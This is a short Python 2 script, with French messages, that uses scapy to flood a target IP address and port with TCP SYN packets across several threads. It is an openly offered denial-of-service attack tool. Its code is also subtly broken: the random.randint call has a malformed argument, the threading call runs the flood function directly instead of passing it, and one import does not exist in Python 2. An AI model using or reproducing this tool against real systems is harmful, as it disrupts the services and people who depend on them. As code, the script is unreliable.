# coding=utf-8
import random
import sys
import thread
from scapy.all import *
from scapy.layers.inet import IP, TCP
import logging

from typing import Any, Union

if len(sys.argv) != 4:
    print "utilistaton - ./SYN flooding.py [IP_TARGET] [PORT_NUMBER] [THREAD]"

    sys.exit()

Target = str(sys.argv[1])
Port = int(sys.argv[2])
Threads = int(sys.argv[3])
print "SYN Flooding en cour ctr+c pour arretez"


def synflood(Target, Port):
    while 1:
        x = random.randint(0.655535)
        send(IP(dst=Target)/TCP(dport=Port, sport=x), verbose=0)


for x in range(0, Threads):
    thread.start_new_thread(synflood(Target, Port))
